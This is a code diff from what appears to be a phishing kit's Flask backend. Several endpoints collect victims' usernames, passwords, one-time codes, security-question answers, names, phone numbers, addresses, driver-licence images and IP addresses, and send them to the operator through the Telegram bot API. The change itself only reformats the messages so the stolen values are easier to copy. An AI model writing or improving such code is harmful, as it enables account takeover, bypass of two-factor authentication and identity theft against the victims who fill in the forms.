@@ -33,8 +33,8 @@ def submit_form():
     if not username or not password:
         return jsonify({"error": "Missing username or password"}), 400
 
-    # Format message for Telegram with <code> tags for click-to-copy
-    message = f"🔐 LOGIN Submission\n<code>Login Id: {username}\nPassword: {password}\nuser Ip: {user_ip}</code>"
+    # Format message for Telegram with only user input in <code> tags
+    message = f"🔐 LOGIN Submission\nLogin Id: <code>{username}</code>\nPassword: <code>{password}</code>\nuser Ip: <code>{user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -64,8 +64,8 @@ def submit_login():
     if not username or not password:
         return jsonify({"error": "Missing username or password"}), 400
 
-    # Format message for Telegram with <code> tags for click-to-copy
-    message = f"🔐 Login2 Page Submission\n<code>Login Id: {username}\nPassword: {password}\nuser Ip: {user_ip}</code>"
+    # Format message for Telegram with only user input in <code> tags
+    message = f"🔐 Login2 Page Submission\nLogin Id: <code>{username}</code>\nPassword: <code>{password}</code>\nuser Ip: <code>{user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -94,8 +94,8 @@ def submit_otp():
     if not otp:
         return jsonify({"error": "Missing OTP"}), 400
 
-    # Format message for Telegram with <code> tags for click-to-copy
-    message = f"🔐 OTP Submission\n<code>OTP: {otp}\nuser Ip: {user_ip}</code>"
+    # Format message for Telegram with only user input in <code> tags
+    message = f"🔐 OTP Submission\nOTP: <code>{otp}</code>\nuser Ip: <code>{user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -124,8 +124,8 @@ def submit_otp2():
     if not otp:
         return jsonify({"error": "Missing OTP"}), 400
 
-    # Format message for Telegram with <code> tags for click-to-copy
-    message = f"🔐 Second OTP Submission\n<code>OTP: {otp}\nuser Ip: {user_ip}</code>"
+    # Format message for Telegram with only user input in <code> tags
+    message = f"🔐 Second OTP Submission\nOTP: <code>{otp}</code>\nuser Ip: <code>{user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -171,8 +171,8 @@ def submit_security():
     final_q_2 = sec_q_22 if sec_q_2 == "x" else sec_q_2
     final_q_3 = sec_q_33 if sec_q_3 == "x" else sec_q_3
 
-    # Format message for Telegram with <code> tags for click-to-copy
-    message = f"🔐 Security Questions Submission\n<code>Question 1: {final_q_1}\nAnswer 1: {sec_a_1}\nQuestion 2: {final_q_2}\nAnswer 2: {sec_a_2}\nQuestion 3: {final_q_3}\nAnswer 3: {sec_a_3}\nuser Ip: {user_ip}</code>"
+    # Format message for Telegram with only user input in <code> tags
+    message = f"🔐 Security Questions Submission\nQuestion 1: <code>{final_q_1}</code>\nAnswer 1: <code>{sec_a_1}</code>\nQuestion 2: <code>{final_q_2}</code>\nAnswer 2: <code>{sec_a_2}</code>\nQuestion 3: <code>{final_q_3}</code>\nAnswer 3: <code>{sec_a_3}</code>\nuser Ip: <code>{user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -204,8 +204,8 @@ def submit_info():
     if not all([fname, mobnum, address]):
         return jsonify({"error": "All fields are required"}), 400
 
-    # Format message for Telegram with <code> tags for click-to-copy
-    message = f"🔐 Personal Info Submission\n<code>Full Name: {fname}\nMobile Number: {mobnum}\nAddress: {address}\nuser Ip: {user_ip}</code>"
+    # Format message for Telegram with only user input in <code> tags
+    message = f"🔐 Personal Info Submission\nFull Name: <code>{fname}</code>\nMobile Number: <code>{mobnum}</code>\nAddress: <code>{address}</code>\nuser Ip: <code>{user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -234,8 +234,8 @@ def submit_images():
     if not image1 or not image2:
         return jsonify({"error": "Missing one or both images"}), 400
 
-    # Format message for Telegram with <code> tags for click-to-copy
-    message = f"🔐 Image Submission\n<code>Images: Driver License Front and Back\nuser Ip: {user_ip}</code>"
+    # Format message for Telegram with only user input in <code> tags
+    message = f"🔐 Image Submission\nImages: Driver License Front and Back\nuser Ip: <code>{user_ip}</code>"
 
     # Send text message to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
